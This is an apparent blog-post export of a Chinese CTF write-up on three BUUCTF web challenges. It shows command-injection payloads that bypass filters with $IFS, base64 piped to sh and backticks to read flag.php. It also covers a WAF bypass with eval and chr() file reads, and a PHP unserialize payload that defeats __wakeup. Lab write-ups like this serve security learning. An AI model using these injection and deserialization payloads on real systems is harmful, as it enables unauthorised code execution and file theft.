{"name":"buu前15个题","slug":"buu前15个题","count":1,"postlist":[{"title":"buu-web零碎1.0","slug":"buu-web零碎1.0","date":"2021-02-04T07:55:09.000Z","updated":"2021-02-06T09:55:20.288Z","comments":true,"path":"api/articles/buu-web零碎1.0.json","excerpt":"","keywords":null,"cover":null,"content":"<h2 id=\"GXYCTF2019-Ping-Ping-Ping\"><a href=\"#GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping\"></a>[GXYCTF2019]Ping Ping Ping</h2><p>考察命令执行漏洞绕过<br>？ip=127.0.0.1|ls 看当前目录下的文件<br>？ip=127.0.0.1|cat index.php 看index.php文件  </p>\n<p>发现空格被过滤 绕过空格的方法如下：<br>$IFS<br>${IFS}<br>$IFS$数字<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}<br>经过尝试，发现第三个没被过滤掉<br>？ip=127.0.0.1|cat$IFS$6index.php 可查看文件</p>\n<h2 id=\"index-php文件如下\"><a href=\"#index-php文件如下\" class=\"headerlink\" title=\"index.php文件如下\"></a>index.php文件如下</h2><pre><code>|\\&#39;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123;\necho preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#39;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match);\ndie(&quot;fxck your symbol!&quot;);\n &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;\ndie(&quot;fxck your space!&quot;);\n &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;\ndie(&quot;fxck your bash!&quot;);\n&#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;\ndie(&quot;fxck your flag!&quot;);\n &#125;\n $a = shell_exec(&quot;ping -c 4 &quot;.$ip);\n echo &quot;\n\n&quot;;\n print_r($a);\n&#125;  </code></pre>\n<p>发现index.php中过滤了很多字符，过滤了bash命令，flag字符串，还有一系列的符号，虽然过滤了bash命令我们还可以使用sh。sh的脚本基本上都可以在bash下运行。<br>现在访问flag.php</p>\n<h3 id=\"sh\"><a href=\"#sh\" class=\"headerlink\" title=\"sh\"></a>sh</h3><p>payload:<br>?ip=127.0.0.1;echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh<br>(将“cat flag.php”经base64转码得到)</p>\n<h3 id=\"变量拼接\"><a href=\"#变量拼接\" class=\"headerlink\" title=\"变量拼接\"></a>变量拼接</h3><p>index.php代码有一个变量a,可以用变量a代替被过滤的flag中的某个字符，从而绕过flag过滤，进而读取flag<br>/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php</p>\n<h3 id=\"内联注释\"><a href=\"#内联注释\" class=\"headerlink\" title=\"内联注释\"></a>内联注释</h3><p>/?ip=127.0.0.1;cat$IFS$2<code>ls</code><br>将反引号内命令的输出结果作为输入来进行命令执行，这样flag.php和index.php的结果都能直接查看  </p>\n<hr>\n<h2 id=\"RoarCTF-2019-Easy-Calc\"><a href=\"#RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Calc\"></a>[RoarCTF 2019]Easy Calc</h2><p>查看源码，说有WAF，看到提示有一个calc.php文件，访问<br>访问结果，传参为num，并且有黑名单，过滤了字母t，r，[，]等，基本上一句话是不管用。<br>有eval()函数，说不定有代码执行漏洞：eval()代码执行漏洞，1,2<br>num传参测试： ？num=123123,可显，数字可显，字母不可显 字母都被WAF拦截，利用PHP的字符串解析特性绕过waf，PHP字符串解析特性。<br><u>由于php在解析url中的参数时，保存前会把num前面的空格去掉再解析，所以在num前加空格可绕过WAF</u>，在num前加个空格，弹出之前代码中的提示，只要在黑名单中，都会提示what are you want to do?<br>可以查phpinfo()<br>payload:      ? num=phpinfo()<br>PHP函数：<br>scandir()：以数组形式返回指定目录中的文件和目录<br>var_dump()：输出变量的相关信息。<br>var_dump()：显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。<br>file_get_contents()：把整个文件读入一个字符串中。  </p>\n<ul>\n<li>var_dump(scandir(chr(47))): 查看文件目录（“/”被过滤了，可以使用chr(47)来进行表示，进行目录读取）</li>\n<li>?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))  读取flag  </li>\n</ul>\n<hr>\n<h2 id=\"极客大挑战-2019-PHP\"><a href=\"#极客大挑战-2019-PHP\" class=\"headerlink\" title=\"[极客大挑战 2019]PHP\"></a>[极客大挑战 2019]PHP</h2><p>后缀 <a href=\"http://www.zip找到备份文件/\">www.zip找到备份文件</a>  </p>\n<hr>\n<pre><code>&lt;?php\ninclude &#39;class.php&#39;;\n$select = $_GET[&#39;select&#39;];\n$res=unserialize(@$select);\n?&gt;</code></pre>\n<hr>\n<pre><code>&lt;?php\ninclude &#39;flag.php&#39;;\n\nerror_reporting(0);\n\n\nclass Name&#123;\nprivate $username = &#39;nonono&#39;;\nprivate $password = &#39;yesyes&#39;;\n\npublic function __construct($username,$password)&#123;\n    $this-&gt;username = $username;\n    $this-&gt;password = $password;\n&#125;\n\nfunction __wakeup()&#123;\n    $this-&gt;username = &#39;guest&#39;;\n&#125;\n\nfunction __destruct()&#123;\n    if ($this-&gt;password != 100) &#123;\n        echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;\n        echo &quot;You name is: &quot;;\n        echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;\n        echo &quot;You password is: &quot;;\n        echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;\n        die();\n    &#125;\n    if ($this-&gt;username === &#39;admin&#39;) &#123;\n        global $flag;\n        echo $flag;\n    &#125;else&#123;\n        echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;\n        die();\n\n    &#125;\n&#125;\n&#125;\n?&gt;  </code></pre>\n<p>看了代码没啥头绪，看大佬们的wp，这个题考察反序列化<br>序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。</p>\n<p>概念很容易理解，其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。<br><a href=\"https://blog.csdn.net/v1040375575/article/details/111646602?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%20%20%20%20%20$res=unserialize\">https://blog.csdn.net/v1040375575/article/details/111646602?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%20%20%20%20%20$res=unserialize</a>  </p>\n<p>  对传入的select反序列化后满足 password = 100 和username === ‘admin’<br>然后构造反序列化：<br>O是对象，s是字符串，i是数字,脚本：</p>\n<pre><code>&lt;?php\nclass Name&#123;\n    private $username = &#39;nonono&#39;;\n    private $password = &#39;yesyes&#39;;\n    public function __construct($username,$password)&#123;\n        $this-&gt;username = $username;\n        $this-&gt;password = $password;\n    &#125;\n    public function __wakeup()&#123;\n        $this-&gt;username = &quot;guests&quot;;\n    &#125;\n    public function fun()&#123;\n        echo $this-&gt;username;echo &quot;&lt;br&gt;&quot;;echo $this-&gt;password;\n    &#125;\n&#125;\n$a = serialize(new Name(&quot;admin&quot;,100));\necho $a;\n?&gt;</code></pre>\n<p>因为是private修饰的所以要加%00充当空格  </p>\n<pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></pre>\n<p>payload：</p>\n<pre><code>url+?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></pre>\n","text":"[GXYCTF2019]Ping Ping Ping考察命令执行漏洞绕过<br>？ip=127.0.0.1|ls 看当前目录下的文件<br>？ip=127.0.0.1|cat index.php 看index.php文件  发现空格被过滤 绕过空格的方法如下：<br>$IFS<b","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"buu前15个题","slug":"buu前15个题","count":1,"path":"api/tags/buu前15个题.json"}]}]}